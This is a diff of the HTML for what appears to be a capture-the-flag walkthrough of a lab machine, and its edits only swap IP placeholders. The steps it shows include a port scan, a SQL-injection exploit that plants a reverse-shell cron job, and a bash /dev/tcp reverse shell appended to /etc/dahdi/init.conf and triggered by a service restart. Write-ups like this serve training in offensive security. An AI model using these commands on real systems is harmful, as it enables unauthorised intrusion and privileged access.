@@ -3387,7 +3387,7 @@
 </ol>
 <h2 id="1-reconnaissance">1. Reconnaissance<a class="headerlink" href="#1-reconnaissance" title="Permanent link">&para;</a></h2>
 <p>The full scan found three exposed TCP services:</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>nmap<span class="w"> </span>-p-<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">1000</span><span class="w"> </span>-T4<span class="w"> </span>-Pn<span class="w"> </span>-sV<span class="w"> </span>-oA<span class="w"> </span>nmap_full_scan<span class="w"> </span>&lt;TARGET_IP&gt;
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>nmap<span class="w"> </span>-p-<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">1000</span><span class="w"> </span>-T4<span class="w"> </span>-Pn<span class="w"> </span>-sV<span class="w"> </span>-oA<span class="w"> </span>nmap_full_scan<span class="w"> </span>LAB_IP
 </span></code></pre></div>
 <table>
 <thead>
@@ -3428,14 +3428,14 @@
 
 <h2 id="2-obtain-a-shell-through-the-web-application">2. Obtain a shell through the web application<a class="headerlink" href="#2-obtain-a-shell-through-the-web-application" title="Permanent link">&para;</a></h2>
 <p>The source notes use a proof of concept for the SQL-injection issue. The important behavior is that the exploit inserts a temporary cron job that connects back to the operator, waits for the callback, and removes the job to avoid repeated connections.</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>python3<span class="w"> </span>exploit.py<span class="w"> </span>http://connected.htb<span class="w"> </span>--ip<span class="w"> </span>&lt;LHOST&gt;
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>python3<span class="w"> </span>exploit.py<span class="w"> </span>http://connected.htb<span class="w"> </span>--ip<span class="w"> </span>CALLBACK_IP
 </span></code></pre></div>
 <p>A successful run reports the database version, creates the cron job and returns an interactive shell:</p>
 <div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>[+] Vulnerable! DB version: 5.5.65-MariaDB
 </span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>[*] Injecting reverse-shell cron job ...
 </span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>[+] Cron job 'jkbthmng' inserted (runs every minute).
 </span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>[*] Waiting for callback (up to ~70s) ...
-</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>[+] Shell from &lt;TARGET_IP&gt;:&lt;CALLBACK_PORT&gt; !
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>[+] Shell from LAB_IP:CALLBACK_PORT !
 </span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>[+] Removed cron job 'jkbthmng' (no repeat callbacks).
 </span></code></pre></div>
 <p>Stabilize the callback before continuing:</p>
@@ -3454,7 +3454,7 @@
 </span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">9001</span>
 </span></code></pre></div>
 <div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1"># From the asterisk shell</span>
-</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="nb">printf</span><span class="w"> </span><span class="s1">'%s\n'</span><span class="w"> </span><span class="s1">'bash -c "bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/9001 0&gt;&amp;1" &amp;'</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="nb">printf</span><span class="w"> </span><span class="s1">'%s\n'</span><span class="w"> </span><span class="s1">'bash -c "bash -i &gt;&amp; /dev/tcp/CALLBACK_IP/9001 0&gt;&amp;1" &amp;'</span><span class="w"> </span><span class="se">\</span>
 </span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="w">  </span>&gt;&gt;<span class="w"> </span>/etc/dahdi/init.conf
 </span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>
 </span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">'restart'</span><span class="w"> </span>&gt;<span class="w"> </span>/var/spool/asterisk/sysadmin/dahdi_restart
